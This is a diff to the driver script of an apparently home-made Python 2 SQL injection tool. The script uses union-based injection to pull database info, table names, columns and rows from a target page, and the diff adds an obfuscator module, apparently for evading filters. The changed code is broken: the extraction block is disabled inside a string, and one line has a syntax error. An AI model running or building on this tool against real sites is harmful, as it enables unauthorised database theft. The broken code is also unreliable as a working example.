@@ -10,7 +10,7 @@
 """
 
 import os, sys, urllib2
-import builder, datastore, injector, scanner, parser, reporter
+import builder, datastore, injector, scanner, obfuscator, parser, reporter
 import pprint
 import json
 
@@ -47,7 +47,12 @@ if __name__ == '__main__':
     fang = injector.Injector(page, "")
     report = reporter.Reporter()
     parse = parser.Parser(store)
+    obfuscate = obfuscator.Obfuscator()
 
+
+    #print obfuscate.by_padding('XXXXX', '/**/')
+
+    """
     # Get column data for union statement
     print '\n### Basic Page Structure ###'
     num_columns = fang.get_num_columns() 
@@ -58,27 +63,28 @@ if __name__ == '__main__':
 
     # Get DB params
     print '\n### Basic DB Info ###'
-    data = fang.injection(build.union(num_columns, magic_num)) 
-    report.db_info(parse.params(data))
+    db_data = fang.injection(build.union(num_columns, magic_num)) 
+    report.db_info(parse.params(db_data))
 
     # Get tables
     print '### Interesting Tables ###'
-    data = fang.injection(build.tables(num_columns, magic_num)) 
-    report.tables(parse.tables(data))
+    tables = fang.injection(build.tables(num_columns, magic_num)) 
+    report.tables(parse.tables(tables))
 
-    # Get columns
+    # Get columns, one table at a time
     print '\n### DB Table Columns ###'
-    print build.columns(num_columns, magic_num, data['table_name'])
-    data = fang.injection(build.columns(num_columns, magic_num, data['table_name'])) 
-    report.columns(parse.columns(data))
+    columns = fang.injection(build.columns(num_columns, magic_num, tables['table_name'])) 
+    report.columns(parse.columns(columns))
+    columns = parse.columns(columns)
 
     # Get rows
-    data = parse.columns(data)
-    x = build.rows(num_columns, magic_num, 'user', data)
+    for column in columns:
+        x = build.rows(num_columns, magic_num, , data)
+        print x
     data = fang.injection(x)
-    print data
+    #print data
     #print parse.rows(data)
     #report.XXX(parse.XXX(data))
-        
+    """  
 
 
